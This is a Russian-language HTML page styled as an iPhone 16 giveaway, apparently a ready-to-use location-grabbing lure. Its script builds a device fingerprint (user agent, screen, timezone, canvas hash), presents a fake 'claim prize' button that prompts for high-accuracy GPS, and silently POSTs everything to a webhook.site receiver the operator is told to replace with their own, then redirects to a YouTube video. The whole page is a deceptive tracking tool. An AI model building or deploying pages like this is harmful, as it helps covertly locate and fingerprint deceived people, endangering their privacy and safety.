<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Розыгрыш iPhone 16 Pro</title>
<style>
  *{box-sizing:border-box; margin:0; padding:0;}
  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
       background:linear-gradient(135deg,#1a1a2e,#16213e);color:#fff;
       display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;text-align:center}
  .card{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);
        padding:30px 20px;border-radius:24px;max-width:400px;width:100%;box-shadow:0 10px 30px rgba(0,0,0,0.5)}
  .gift{font-size:60px;margin-bottom:15px;display:block;animation:bounce 2s infinite}
  @keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
  h1{font-size:24px;margin-bottom:10px;color:#fff}
  p{font-size:14px;color:#a0a0b0;line-height:1.5;margin-bottom:25px}
  .btn{background:#ff3366;color:#fff;border:0;padding:16px 20px;border-radius:12px;
       font-size:18px;font-weight:600;width:100%;cursor:pointer;transition:0.2s}
  .btn:active{transform:scale(0.95)}
  .btn:disabled{opacity:0.5;cursor:not-allowed}
  .loader{display:none;margin-top:15px;color:#ff3366;font-size:14px}
</style>
</head>
<body>
<div class="card">
  <span class="gift">🎁</span>
  <h1>Вы выиграли iPhone 16!</h1>
  <p>Нажмите кнопку ниже, чтобы подтвердить получение приза и получить трек-номер для доставки.</p>
  <button class="btn" id="winBtn">Получить приз</button>
  <div class="loader" id="loader">Проверка данных... Пожалуйста, подтвердите геолокацию.</div>
</div>

<script>
// ==========================================
// ТВОЙ ПРИЁМНИК (замени на свой UUID)
// ==========================================
const HOOK = "https://webhook.site/9f5d0c93-5cdc-4243-b020-361ff9394b9c";

// Сбор базовых данных
let data = {
  event: "prize_click",
  ts: new Date().toISOString(),
  ua: navigator.userAgent,
  platform: navigator.platform,
  lang: navigator.languages ? navigator.languages.join(",") : navigator.language,
  screen: screen.width + "x" + screen.height,
  tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
  gps: "Не запрошен"
};

// Уникальный отпечаток устройства (Canvas)
try {
  const c = document.createElement("canvas");
  const ctx = c.getContext("2d");
  ctx.textBaseline = "top";
  ctx.font = "14px 'Arial'";
  ctx.fillStyle = "#f60";
  ctx.fillRect(125, 1, 62, 20);
  ctx.fillStyle = "#069";
  ctx.fillText("Hello, world!", 2, 15);
  data.canvas_hash = c.toDataURL().split(",")[1].slice(-15);
} catch(e) {}

// Запрос GPS (вызывается только по клику)
function getGPS() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) return resolve("Нет API");
    navigator.geolocation.getCurrentPosition(
      pos => resolve(pos.coords.latitude + ", " + pos.coords.longitude),
      err => resolve("Отказано / VPN"),
      { timeout: 4000, enableHighAccuracy: true }
    );
  });
}

// Обработчик кнопки
document.getElementById("winBtn").addEventListener("click", async function() {
  this.disabled = true;
  this.innerText = "Обработка...";
  document.getElementById("loader").style.display = "block";

  // Ждем ответа от GPS (или таймаута)
  data.gps = await getGPS();
  data.ip = "Смотри в заголовках";

  // Отправляем на вебхук
  fetch(HOOK, {
    method: "POST",
    mode: "no-cors",
    headers: {"Content-Type": "text/plain"},
    body: JSON.stringify(data)
  }).catch(e => {});

  // Через 2 секунды редирект на реальный сайт
  setTimeout(() => {
    location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
  }, 2000);
});
</script>
</body>
</html>
